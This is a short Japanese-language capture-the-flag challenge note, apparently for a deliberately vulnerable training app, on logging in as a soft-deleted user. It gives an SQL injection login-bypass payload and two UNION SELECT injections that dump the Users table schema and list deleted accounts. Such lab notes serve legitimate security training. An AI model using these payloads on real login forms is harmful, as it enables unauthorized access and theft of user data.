# Ghost Login ❌

**難易度:** ⭐⭐⭐
**カテゴリ:** SQLi
**目標:** 削除済み（論理削除）ユーザーとしてログインする

## ヒント

- **データベース構造:** `Users` テーブルに `deletedAt` カラムがある
- **論理削除:** ユーザーは物理的に削除されず、`deletedAt` にタイムスタンプが設定される
- **SQLi:** ログインフォームで `deletedAt IS NOT NULL` 条件を追加

## 攻撃ペイロード

```sql
-- メールアドレス欄に入力
' or deletedAt IS NOT NULL--

-- パスワードは任意
```

## 確認方法

```sql
-- DBスキーマ確認用SQLi
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table' AND name='Users'--

-- 削除済みユーザー一覧
')) UNION SELECT id,email,deletedAt,4,5,6,7,8,9 FROM users WHERE deletedAt IS NOT NULL--
```

## 検証ポイント

- [ ] 削除済みユーザーが存在するか
- [ ] ログイン成功後のユーザー情報を確認

## 解説

[未着手]
